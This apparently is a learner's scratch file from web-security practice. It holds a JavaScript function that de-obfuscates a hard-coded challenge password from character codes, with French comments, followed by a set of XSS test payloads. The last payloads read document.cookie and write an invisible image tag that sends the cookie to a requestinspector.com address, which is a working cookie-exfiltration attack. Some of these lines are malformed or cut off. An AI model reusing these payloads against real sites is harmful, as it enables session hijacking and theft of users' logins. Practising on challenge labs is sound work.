function dechiffre(pass_enc){

        console.log(pass_enc);
          console.log(String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50));

          //String.fromCharCode
          //=note reche googel!La méthode statique String.fromCharCode()
          //renvoie une chaîne de caractères créée à partir de points de code UTF-16!
          //fonction deresolution :Pour resoudre se proble je passe le resuta de console.log(pass_enc). Dans la methode String.fromCharCode() ;
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";

        var tab  = pass_enc.split(',');
                var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = "";i = 0;j = tab.length;
                        k = j + (l) + (n=0);
                        n = tab2.length;
                        for(i = (o=0); i < (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i]));
                                if(i == 5)break;}
                        for(i = (o=0); i < (k = j = n); i++ ){
                        o = tab[i-l];
                                if(i > 5 && i < k-1)
                                        p += String.fromCharCode((o = tab2[i]));
                        }

        p += String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
        pass = p;return pass;

    }

    String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));

    h = window.prompt('Entrez le mot de passe / Enter password');
    alert( dechiffre(h) );



///////

<script> console.log('teste HoHO!')</script>
<script> console.log(document)</script>
<script> console.log(document.cookie, )</script>
<script> console.log(document.cookie,document.location, )</script>
<script> document.write('<img src "https://requestinspector.com/inspect/01grev308s0s84kr0edy795eyq?cookie='+document.cookie+'" width=0 height=0 border=0 />');</script>

<script> document.write('+document.cookie+'" width=0 height=0 border=0 />');</script>
